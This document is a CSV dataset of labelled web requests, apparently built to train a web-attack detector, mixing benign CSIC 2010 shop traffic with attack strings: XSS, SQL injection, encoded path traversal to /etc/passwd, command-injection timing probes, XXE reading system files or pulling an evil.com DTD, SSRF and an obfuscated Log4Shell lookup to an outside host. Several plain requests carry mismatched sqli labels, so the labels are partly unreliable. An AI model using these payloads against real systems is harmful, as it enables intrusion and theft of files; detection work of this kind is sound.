payload,label,source
modo=registro&login=matsuzak&password=de82g%F3gic8&nombre=Hayd%E9e&apellidos=Arrotcharen+Doniz&email=kontou%4015horas.wf&dni=06384093Y&direccion=Calle+Crucero-bouzas%2C+185%2C+&ciudad=Leaburu&cp=32730&provincia=Teruel&ntc=0473794196460600&B1=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,sqli,csic_2010
"GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=74549D32847DD59E0ABC505AE8F170BB Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=8DF79FC92028D28C772A1AD441E70AAC Connection: close",normal,csic_2010
"<!DOCTYPE foo [<!secret879 secret879 PUBLIC ""-//ATT//DTD//EN"" ""http://evil.com/evil.dtd"">]><foo>&secret879;</foo>",xxe,augmented
"POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=CABC83047BA9EB61EC0F5D8DE24101DA Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=6F13A3F02B5E6FFA460041C16BA26BB8 Connection: close",normal,csic_2010
C:\Program Files\IceWarp\html\webmail\client\objects\obj_list.xml,path_traversal,seclists
"GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=5C44C3511C09FE6D37D51F75D0B63C75 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=58263CF753EC1F090FF81267F993B8A4 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"union select 1,load_file('/etc/passwd'),1,1,1;",sqli,seclists
modo=registro&login=ping-she&password=0es2278g7da&nombre=Prudencio&apellidos=Graells+Frigola&email=olmer%40matchball.com.im&dni=75872778X&direccion=Grupo+Rives+Pla%2C+168+1%3FA&ciudad=Castropodame&cpA=09640&provincia=Girona&ntc=2104052374187085&B1=Registrar,sqli,csic_2010
"GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=5FDAF1E6478506018FD5D99539C6A66A Connection: close",normal,csic_2010
.../.%bg%qf.../.%bg%qfetc%bg%qfissue,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=315C181E53A3F6C3F701781FC025C320 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/asf-logo-wide.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=A5E4E5C6ECDB1868ABE5753ADA018851 Connection: close",sqli,csic_2010
"<comment><img src=""</comment><img src=x onerror=alert(38)//"">",xss,seclists
modo=registro&login=zadow&passwordA=alternaci-59&nombre=Gyana&apellidos=Farell+Lattuf&email=bushell%40sayuela.uk&dni=23485919K&direccion=C%2F+Juan+Ii%2C+108+12%3FC&ciudad=Inviernas%2C+Las&cp=37428&provincia=Tarragona&ntc=0299500452895556&B1=Registrar,sqli,csic_2010
%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts,path_traversal,payloads_all_the_things
"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=0DF542911E9C492965D5B482B703750C Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
sftp://192.168.1.1/.git/config,ssrf,augmented
"POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=5DEDB437EBDCC07A9DD8D40C1D38DA48 Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
../proc/self/fd/30,path_traversal,seclists
"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=506B55727C67487D5E71108ACD33C46B Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=B492C53A7A1037D2A12577B3A37866FB Connection: close",normal,csic_2010
/Program Files/Apache Group/Apache2/conf/httpd.conf%00,path_traversal,seclists
/etc/aolserver/skel/init,path_traversal,seclists
.?%u2216.?%u2216.?%u2216.?%u2216.?%u2216.?%u2216etc%u2216passwd,path_traversal,payloads_all_the_things
/%252e%252e/%252e%252e/%252e%252e/{FILE},path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=84D2F9E11235B5FE5F3700C92CAE050C Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=258AC0E352F7AC3CB5EA1CA9345A3BDE Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=integrat&password=6g369zaR41&nombre=Livino&apellidos=Olmo&email=gentry.gast%40luchalibremexicana.cat&dni=92269883R&direccion=Romejal+Carrascal%2C+48%2C+3%3FD&ciudad=Mart%EDn+Miguel&cp=22513&provincia=Cuenca&ntc=4999320970641134&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=5D8845AFE57186BAA39D1F59129A62C9 Connection: close",normal,csic_2010
'print(`echo%20KKQSRA`.`echo%20$((71%2B76))`.`echo%20KKQSRA`.`echo%20KKQSRA`)%3B%23KKQSRA,command_injection,seclists
<canvas id=x tabindex=1 onfocus=alert(1)></canvas>,xss,seclists
"POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=3D2046FEE1AE0E262A5D3A080BEF42C8 Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=77B032FC636B1B0942958C584364FF31 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=4EB00598E2B846BAD7D353A62EBC3912 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
id=3&nombre=Vino+Rioja&precio=39&cantidad=64&B1=A%F1adir+al+carrito,normal,csic_2010
"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=002AB18C70E3DA8659CC058D61A7EC2C Connection: close",normal,csic_2010
%22;echo$IFSUOJTRY$((93%2B10))$(echo$IFSUOJTRY)UOJTRY%7C,command_injection,seclists
/usr/local/apache1.3/conf/httpd.conf,path_traversal,seclists
C:\Program Files\IceWarp\html\webmail\client\objects\obj_view_filter.xml,path_traversal,seclists
"""%7Cecho$IFSUDEEGX$((28%2B85))$(echo$IFSUDEEGX)UDEEGX""",command_injection,seclists
modo=entrar&login=chianfon&pwd=CedrIno&remember=off&B1=Entrar,normal,csic_2010
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!file401 file401 SYSTEM ""/var/log/auth.log"">]><foo>&file401;</foo>",xxe,augmented
"GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=0C9D350FC5793876D49EFC4E415F9331 Connection: close",normal,csic_2010
id=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=80&B1=A%F1adir+al+carrito,sqli,csic_2010
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..\..\..\etc\issue,path_traversal,payloads_all_the_things
..\..\..\etc\issue%00,path_traversal,payloads_all_the_things
modo=entrar&login=vanda&pwd=5esl4chu6002ra&remember=off%2B&B1=Entrar,sqli,csic_2010
"<footer onmouseover=""alert(1)"">test</footer>",xss,seclists
"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=AB4BC7D4397BF246D8D85C350A2A29EE Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=9CE9DAF559D472034747877C9BC2DCFE Connection: close",normal,csic_2010
%2527%7C%20%5B%203%20-ne%20%24%28echo%20YGEOKN%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20,command_injection,seclists
C:\Program Files\WindowsApps\microsoft.microsoft3dviewer_7.2004.20022.0_x64__8wekyb3d8bbwe\common.view.uwp\strings\zh-cn\view3d\3dviewerproductdescription-universal.xml,path_traversal,seclists
"GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=DC394E1AC8291CF5473CE60494B7CDD1 Connection: close",normal,csic_2010
"<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE foo [<!data65 data65 SYSTEM ""file:///etc/crontab"">]><foo>&data65;</foo>",xxe,augmented
modo=registro&login=chin-lin&password=c4l6716o&nombre=Santo&apellidos=Ganoza&email=aprea%40ingenelec.es&dni=81023504R&direccion=Pl.+Quintero+Baez%2C+137+&ciudad=Carde%F1a&cp=09198&provincia=Vizcaya&ntc=3454478326370479&B1=Registrar,normal,csic_2010
"POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=FB342BD39A64C61EE64DCCC51C7866AF Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
%3B%20str%3D%24%28echo%20RPPEVG%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522,command_injection,seclists
"POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=6B240B8A5A7A458410A715CEEA5F3AA7 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
${${::-j}${::-n}${::-d}${::-i}:ldap://burpcollab.net:443/x},log4shell,augmented
%e0%80%ae%e0%80%ae%2f%e0%80%ae%e0%80%ae%2f%e0%80%ae%e0%80%ae%2f%e0%80%ae%e0%80%ae%2fetc%2fissue,path_traversal,payloads_all_the_things
..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025etc%uF025issue,path_traversal,payloads_all_the_things
"POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=0EA2D0A9EC52030319FEB065C8E72A44 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=649900F8FF5F9D1DAB9BA97D71D31CB2 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
%2e%2e/windows/system32/drivers/etc/hosts,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=C324D52A71EEBBB18C2C1DE2CA661CD4 Connection: close",normal,csic_2010
.%00.0x2f.%00.0x2f.%00.0x2f.%00.0x2f.%00.0x2f.%00.0x2fetc0x2fissue,path_traversal,payloads_all_the_things
modo=registro&login=cherilyn2&password=enastada&nombre=Teinad&apellidos=Lloses+Chavez&email=pesek-roscoe%40monsur.mw&dni=04203637L&direccion=C%2F+Viriato+137+&ciudad=Lozoya&cp=37216&provincia=Barcelona&ntc=3614479756517146&B1=Registrar,normal,csic_2010
%27%0A%20str%3D%24%28echo%20ROEZHE%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%257C,command_injection,seclists
"POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=EB7DD71B5C077EBCD8260647D089BFA5 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
%f0%80%80%ae%f0%80%80%ae%c0%5c%f0%80%80%ae%f0%80%80%ae%c0%5c%f0%80%80%ae%f0%80%80%ae%c0%5c%f0%80%80%ae%f0%80%80%ae%c0%5c%f0%80%80%ae%f0%80%80%ae%c0%5cetc%c0%5cpasswd,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=75C79F77C36CECE82436DF834AF377F0 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=AF2A2A7992F63AAE486D72EE40AC473F Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
%c0%ae%c0%ae%u2216%c0%ae%c0%ae%u2216%c0%ae%c0%ae%u2216%c0%ae%c0%ae%u2216%c0%ae%c0%ae%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts,path_traversal,payloads_all_the_things
/etc/dirvish/dirvish-cronjob,path_traversal,seclists
"<?xml version=""1.0""?><!DOCTYPE data [<!test337 test337 SYSTEM ""expect://id"">]><data>&test337;</data>",xxe,augmented
